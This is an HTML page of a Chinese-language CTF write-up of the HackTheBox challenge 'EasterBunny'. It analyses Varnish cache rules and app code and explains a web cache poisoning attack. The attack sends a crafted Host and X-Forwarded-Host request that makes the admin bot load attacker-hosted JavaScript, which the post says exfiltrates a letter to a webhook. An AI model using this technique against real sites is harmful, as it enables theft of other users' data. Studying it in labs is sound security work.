@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all看著整份檔案後直接昏厥試著自己解了一下發現想都想不通，就去看別人write up了…結果Burp Suite直接抓包一直過不了，最後用python requests手刻腳本才成功(倒)但是學到好多東西，開心開心ww   Cache AnalyzationCache就是對於頁面的暫存，大致分為server端和browser端。browser端蠻好理解的，像是如果重複造訪一個網頁但">
+<meta property="og:type" content="article">
+<meta property="og:title" content="EasterBunny on HackTheBox">
+<meta property="og:url" content="http://wha13.github.io/2024/04/18/eastern-rabbit-htb/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all看著整份檔案後直接昏厥試著自己解了一下發現想都想不通，就去看別人write up了…結果Burp Suite直接抓包一直過不了，最後用python requests手刻腳本才成功(倒)但是學到好多東西，開心開心ww   Cache AnalyzationCache就是對於頁面的暫存，大致分為server端和browser端。browser端蠻好理解的，像是如果重複造訪一個網頁但">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/rkc8usAlR.png">
+<meta property="article:published_time" content="2024-04-19T02:08:08.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="HackTheBox">
+<meta property="article:tag" content="Cache Poisoning">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/rkc8usAlR.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>EasterBunny on HackTheBox</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/04/20/htb-gamepwn-2024apr/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/04/08/surveillance-htb/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&text=EasterBunny on HackTheBox"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&is_video=false&description=EasterBunny on HackTheBox"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=EasterBunny on HackTheBox&body=Check out this article: http://wha13.github.io/2024/04/18/eastern-rabbit-htb/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&title=EasterBunny on HackTheBox"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&name=EasterBunny on HackTheBox&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/04/18/eastern-rabbit-htb/&t=EasterBunny on HackTheBox"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cache-Analyzation"><span class="toc-number">2.</span> <span class="toc-text">Cache Analyzation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cache-Poisoning"><span class="toc-number">3.</span> <span class="toc-text">Cache Poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">4.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">5.</span> <span class="toc-text">References</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        EasterBunny on HackTheBox
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-04-19T02:08:08.000Z" class="dt-published" itemprop="datePublished">2024-04-18</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/Cache-Poisoning/" rel="tag">Cache Poisoning</a>, <a class="p-category" href="/tags/HackTheBox/" rel="tag">HackTheBox</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p><del>看著整份檔案後直接昏厥</del><br>試著自己解了一下發現想都想不通，就去看別人write up了…<br>結果Burp Suite直接抓包一直過不了，最後用python requests手刻腳本才成功(倒)<br>但是學到好多東西，開心開心ww  </p>
+<h2 id="Cache-Analyzation"><a href="#Cache-Analyzation" class="headerlink" title="Cache Analyzation"></a>Cache Analyzation</h2><p>Cache就是對於頁面的暫存，大致分為server端和browser端。<br>browser端蠻好理解的，像是如果重複造訪一個網頁但你現在是斷網的還是可以儲存方才內容。<br>而server端則是發生在兩次request的cache key是一樣時，給予跟剛才相同的結果回傳。<br>這題是要利用server端的暫存帶來的漏洞進行利用。<br>來分析<code>cache.vcl</code>這支檔案(用來定義整台機器的Cache)<br><strong>cache.vcl</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">vcl 4.1;</span><br><span class="line"></span><br><span class="line">backend default &#123;</span><br><span class="line">    .host = &quot;127.0.0.1&quot;;</span><br><span class="line">    .port = &quot;1337&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_hash &#123;</span><br><span class="line">    hash_data(req.url);</span><br><span class="line"></span><br><span class="line">    if (req.http.host) &#123;</span><br><span class="line">        hash_data(req.http.host);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        hash_data(server.ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return (lookup);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">    set req.http.X-Forwarded-URL = req.url;</span><br><span class="line">    set req.http.X-Forwarded-Proto = &quot;http&quot;;</span><br><span class="line">    if( req.http.host ~ &quot;:[0-9]+&quot; )</span><br><span class="line">    &#123;</span><br><span class="line">        set req.http.X-Forwarded-Port = regsub(req.http.host, &quot;.*:&quot;, &quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        set req.http.X-Forwarded-Port = &quot;80&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ( !( req.url ~ &quot;^/message&quot;) ) &#123;</span><br><span class="line">        unset req.http.Cookie;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub `vcl_backend_response` &#123;</span><br><span class="line">    if (bereq.url ~ &quot;^/$&quot; || bereq.url ~ &quot;^/letters&quot;) &#123;</span><br><span class="line">        set beresp.ttl = 60s;</span><br><span class="line">    &#125; else if (bereq.url ~ &quot;^/message&quot;) &#123;</span><br><span class="line">        if(beresp.status != 200)</span><br><span class="line">        &#123;</span><br><span class="line">            set beresp.ttl = 5s;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            set beresp.ttl = 120s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (bereq.url ~ &quot;^/static&quot;) &#123;</span><br><span class="line">        set beresp.ttl = 120s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub vcl_deliver &#123;</span><br><span class="line">    if (obj.hits &gt; 0) &#123;</span><br><span class="line">        set resp.http.X-Cache = &quot;HIT&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        set resp.http.X-Cache = &quot;MISS&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set resp.http.X-Cache-Hits = obj.hits;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>首先，<code>backend default</code>段落定義了後端cache服務建立在<code>127.0.0.1</code>，端口1337<br>再來，是<code>vcl_hash</code>的段落，這個段落定義了cache key的計算方式：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sub vcl_hash &#123;</span><br><span class="line">    hash_data(req.url);</span><br><span class="line"></span><br><span class="line">    if (req.http.host) &#123;</span><br><span class="line">        hash_data(req.http.host);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        hash_data(server.ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return (lookup);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中，<code>req.url</code>代表了網址的路徑url：<br><code>https://wha13.github.io/hello_world?id=1</code>的req.url會是<code>/hello_world?id=1</code>。<br>而<code>req.http.host</code>代表了封包裡的<code>Host: </code>header。<br><code>vcl_recv</code>段落定義了各項參數抓取的 header 訊息。<br>最後，<code>vcl_backend_response</code>則是定義了cache要針對哪些路徑作暫存，暫存時間為多久：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">sub `vcl_backend_response` &#123;</span><br><span class="line">    if (bereq.url ~ &quot;^/$&quot; || bereq.url ~ &quot;^/letters&quot;) &#123;</span><br><span class="line">        set beresp.ttl = 60s;</span><br><span class="line">    &#125; else if (bereq.url ~ &quot;^/message&quot;) &#123;</span><br><span class="line">        if(beresp.status != 200)</span><br><span class="line">        &#123;</span><br><span class="line">            set beresp.ttl = 5s;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            set beresp.ttl = 120s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else if (bereq.url ~ &quot;^/static&quot;) &#123;</span><br><span class="line">        set beresp.ttl = 120s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>如果正則匹配到<code>letters</code>那是60秒，<code>message</code>則在非200的status code下圍5秒，其他為120秒，<code>static</code>為120秒。<br><code>vcl_driver</code>就是定義回應的header告知cache訊息。  </p>
+<h2 id="Cache-Poisoning"><a href="#Cache-Poisoning" class="headerlink" title="Cache Poisoning"></a>Cache Poisoning</h2><p>回到剛剛的<code>vcl_hash</code>一下，會發現控制cache key的元素都是在送封包時可以偽造的。<br>觀察<code>route.js</code>連接<code>bot.js</code>之片段<br><strong>route.js</strong>  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/submit&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; message &#125; = req.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message) &#123;</span><br><span class="line">        <span class="keyword">return</span> db.<span class="title function_">insertMessage</span>(message)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="keyword">async</span> inserted =&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    botVisiting = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">await</span> <span class="title function_">visit</span>(<span class="string">`http://127.0.0.1/letters?id=<span class="subst">$&#123;inserted.lastID&#125;</span>`</span>, authSecret);</span><br><span class="line">                    botVisiting = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">                    botVisiting = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">201</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(inserted.<span class="property">lastID</span>));</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">                res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Something went wrong!&#x27;</span>));</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">send</span>(<span class="title function_">response</span>(<span class="string">&#x27;Missing required parameters!&#x27;</span>));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p><strong>bot.js</strong>  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">visit</span> = <span class="keyword">async</span>(<span class="params">url, authSecret</span>) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(browser_options);</span><br><span class="line">        <span class="keyword">let</span> context = <span class="keyword">await</span> browser.<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line">        <span class="keyword">let</span> page = <span class="keyword">await</span> context.<span class="title function_">newPage</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;auth&#x27;</span>,</span><br><span class="line">            <span class="attr">value</span>: authSecret,</span><br><span class="line">            <span class="attr">domain</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123;</span><br><span class="line">            <span class="attr">waitUntil</span>: <span class="string">&#x27;networkidle2&#x27;</span>,</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">5000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">await</span> page.<span class="title function_">waitForTimeout</span>(<span class="number">3000</span>);</span><br><span class="line">        <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>會發現請求的<code>req.url</code>是<code>/letters?id=$&#123;inserted.lastID&#125;</code>，而<code>req.host</code>是<code>127.0.0.1</code>。<br>假設現在的末id是10，那下一篇就是11，造成Cache Poisoning的Payload應該要是：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /letters?id=11 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br></pre></td></tr></table></figure>
+<p>再來，觀察<code>route.js</code>中<code>letters</code>的片段：  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/letters&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;viewletters.html&quot;</span>, &#123;</span><br><span class="line">        <span class="attr">cdn</span>: <span class="string">`<span class="subst">$&#123;req.protocol&#125;</span>://<span class="subst">$&#123;req.hostname&#125;</span>:<span class="subst">$&#123;req.headers[<span class="string">&quot;x-forwarded-port&quot;</span>] ?? <span class="number">80</span>&#125;</span>/static/`</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<p>其中，<code>req.hostname</code>的值是綁在<code>X-Forwarded-Host</code>的header上，這邊定義的cdn會傳到templates上去…<br><strong>viewletters.html</strong>  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">style</span>=<span class="string">&quot;margin: 0&quot;</span>&gt;</span>Viewing letter #<span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;letter-id&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span> <span class="attr">id</span>=<span class="string">&quot;error-message&quot;</span> <span class="attr">style</span>=<span class="string">&quot;visibility: hidden;&quot;</span>&gt;</span><span class="symbol">&amp;nbsp;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">  &#123;% include &quot;letter.html&quot; %&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;letter letter-small&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;letter-inner letter-inner-small&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/&quot;</span>&gt;</span>Write New Letter<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;previous&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sign-post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sign-post-text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>View previous<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>letter<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;next&quot;</span> <span class="attr">class</span>=<span class="string">&quot;sign-post flipped&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;sign-post-text&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>View next<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>letter<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;viewletter.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>
+<p>會載入<code>viewletter.js</code>，而它引入了<code>base.html</code>…….<br><code>base.html</code>中有這麼一行：<br><code>&lt;base href=&quot;&#123;&#123;cdn&#125;&#125;&quot; /&gt;</code><br>啊哈！<br>邏輯出來了，因為暫存與cdn取值的方法<code>req.hostname</code>，只要自訂<code>X-Forwarded-Host</code>到自己的host，往<code>/static/viewletter.js</code>塞payload進去就好。<br>理論header：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /letters?id=11 HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">X-Forwarded-Host: william957-web.github.io</span><br></pre></td></tr></table></figure>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>自己的惡意js，抓id&#x3D;3的文章，然後base64丟webhook<br><a target="_blank" rel="noopener" href="https://william957-web.github.io/static/viewletter.js">https://william957-web.github.io/static/viewletter.js</a></p>
